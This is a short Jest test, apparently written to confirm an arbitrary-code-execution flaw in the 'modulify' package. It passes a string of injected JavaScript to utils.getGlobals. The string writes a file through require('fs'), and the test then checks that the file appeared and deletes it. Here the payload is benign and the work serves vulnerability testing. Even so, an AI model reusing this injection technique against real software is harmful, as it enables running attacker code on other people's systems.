const v21 = () => {
    const v12 = expect.assertions(2);
    v12;
    const fs = require('fs');
    const modulify = require('modulify');
    const path = './modulify';
    file_exist = fs.existsSync(path);
    const v13 = expect(file_exist);
    const v14 = v13.toBe(false);
    v14;
    try {
        const v15 = modulify.utils;
        const v16 = v15.getGlobals('require(`fs`).writeFileSync(`modulify`,``)');
        v16;
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v17 = expect(file_exist);
    const v18 = v17.toBe(true);
    v18;
    const v19 = function (err) {
    };
    const v20 = fs.unlink(path, v19);
    v20;
};
const v22 = test('Arbitrary code execution in modulify', v21);
v22;